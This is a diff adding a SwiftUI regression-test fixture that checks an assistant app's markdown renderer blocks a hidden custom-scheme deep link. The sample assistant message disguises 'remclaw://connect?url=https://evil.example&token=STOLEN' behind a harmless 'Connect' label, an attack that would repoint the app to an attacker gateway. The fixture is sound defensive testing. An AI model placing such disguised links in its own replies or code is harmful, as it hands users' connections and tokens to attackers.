@@ -152,6 +152,49 @@ struct AssistantDiagnosticsFixtureView: View {
     }
 }
 
+/// Drives the #1341 exploit hop and proves it closed (#1342 PART 1).
+///
+/// Renders an assistant turn whose prose hides a gateway-repoint deep link behind an innocuous
+/// label — the exact `[Connect](remclaw://connect?url=…&token=…)` shape measured in the
+/// SOURCE-TAXONOMY probe — inside a real `AssistantMarkdownView`, alongside a benign `https` control
+/// link. Tapping "Connect" exercises the real dispatch path (`Text` link → `openURL`), so the
+/// app's own handling is the signal, end to end:
+///
+/// - **Fixed:** the renderer's `AssistantMarkdownLinkPolicy` discards the `remclaw://` scheme, so the
+///   tap dispatches nothing and **no** gateway-repoint alert appears.
+/// - **Reverted** (renderer allowlist removed): the tap dispatches into the app's `onOpenURL`, and
+///   the "Connect to a new gateway? … repoint Rem to evil.example" alert appears — the link reaching
+///   the sink. (PART 2's confirmation is the backstop that makes that reach visible instead of a
+///   silent repoint.)
+struct AssistantCustomSchemeLinkFixtureView: View {
+    private let exploitMarkdown = """
+    Here are your updates. Everything looks on track — [Connect](remclaw://connect?url=https://evil.example&token=STOLEN) to see the full report, or read [the docs](https://example.com/help).
+    """
+
+    var body: some View {
+        ScrollView {
+            VStack(alignment: .leading, spacing: 16) {
+                Text("Custom-scheme link exploit (#1341/#1342)")
+                    .font(DesignTokens.Typography.title3)
+                    .foregroundStyle(DesignTokens.Color.labelPrimary)
+
+                Text("Tap “Connect”. Fixed = nothing happens. Vulnerable = a “repoint Rem to evil.example” gateway alert appears.")
+                    .font(DesignTokens.Typography.body)
+                    .foregroundStyle(DesignTokens.Color.labelSecondary)
+
+                AssistantMarkdownView(markdown: exploitMarkdown)
+                    .padding(16)
+                    .background(DesignTokens.Color.fillTertiary.opacity(0.35))
+                    .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))
+            }
+            .frame(maxWidth: .infinity, alignment: .leading)
+            .padding()
+        }
+        .background(DesignTokens.Color.backgroundPrimary)
+        .navigationTitle("Custom-scheme Link")
+    }
+}
+
 /// Proves the whatsapp_login QR (a *text tool result* of prose + an inline `data:image/png`
 /// markdown image) renders as a scannable image via the tool-result fallback — not buried as
 /// collapsed monospaced text. Uses a real 1×1 PNG data URL so the decode path actually runs.
